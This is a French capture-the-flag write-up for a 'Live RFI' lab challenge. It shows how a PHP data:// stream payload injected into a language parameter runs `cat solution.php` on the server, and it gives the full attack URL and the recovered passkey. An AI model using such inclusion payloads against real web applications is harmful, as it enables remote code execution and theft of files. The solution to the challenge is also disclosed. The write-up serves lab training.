**RFI (Remote File Inclusion)**  est une vulnérabilité de sécurité qui peut survenir dans les applications web en utilisant Data Stream.
Il mentionne l'utilisation de *Data Stream* avec l'exemple suivant : `data://text/plain,<?php echo file_get_contents("solution.php"); ?>`.

Pour notre probleme, il faut voir le contenu de fichier `solution.php`

**Etape à suivre**

1. Allez dans le lien principal de [RFI](https://rfi.warchall.net/)
2. Cliquer sur le logo de langue (choix de langue) => exemple : [RFI langue](https://rfi.warchall.net/index.php?lang=en)
3. Effacer "en" et remplacer par la methode d'attaque Data stream => `data://text/plain,<?php echo`cat solution.php`; ?>`
[lien complet](https://rfi.warchall.net/index.php?lang=data://text/plain,%3C?php%20echo`cat%20solution.php`;%20?%3E)
4. Après, il donne ça : 
````sh
NOTHING HERE????

Warning: Trying to access array offset on value of type int in /home/level/15_live_rfi/www/index.php on line 36

Warning: Trying to access array offset on value of type int in /home/level/15_live_rfi/www/index.php on line 36
````
=> Il suggère que c'est pas là !!!(Nothing here???)

5. Donc, Il faut inspecter ce sitepour voir si la solution cache là (^,^)
   On a trouver qu'il est vraiement là
   
````sh
<!--?php return 'Low_H4NGING_Fruit'; ?-->
````

The passkey is : **Low_H4NGING_Fruit**







